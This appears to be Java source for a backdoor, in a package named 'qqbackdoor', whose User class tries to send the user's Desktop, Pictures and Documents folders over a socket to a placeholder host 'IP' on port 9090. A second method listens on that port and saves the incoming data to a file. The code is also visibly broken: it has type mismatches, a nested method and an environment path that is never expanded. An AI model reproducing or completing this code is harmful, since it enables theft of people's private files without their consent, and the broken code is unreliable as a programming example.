package com.qqTechnologies.qqbackdoor;

// Dependencies 

public class User {
  
  public void Write() {
    System.getenv("USERPROFILE");
    File desktop = new File("%USERPROFILE%\\Desktop");
    File pictures = new File("%USERPROFILE%\\Pictures");
    File documents = new File("%USERPROFILE%\\Documents");

    if ((desktop.exists() && pictures.exists() && documents.exists()) == true) 
    {
      byte desktop_b = desktop.getAbsoluteFile().getBytes();
      byte pictures_b = pictures.getAbsoluteFile().getBytes();
      byte documents_b = documents.getAbsoluteFile().getBytes();
      Socket s = new Socket("IP", 9090);
      BufferedOutputStream b = new BufferedInputStream(s.getOutputStream());
      b.write(desktop_b);
      b.write(pictures_b);
      b.write(documents_b);
      b.close();
    s.close();
    }

    public void Read() {
    try (ServerSocket serverSocket = new ServerSocket(9090)) {
        try (Socket clientSocket = serverSocket.accept();
             InputStream in = clientSocket.getInputStream();
             FileOutputStream fos = new FileOutputStream("xiowmcokwnwosi9wobxuconwpqpnzioan.bin")) {
            
            byte[] buffer = new byte[4096];
            int bytesRead;
          
            while ((bytesRead = in.read(buffer)) != -1) {
                fos.write(buffer, 0, bytesRead);
            }
        }
    } catch (IOException e) {
        e.printStackTrace();
    }
    }
  }
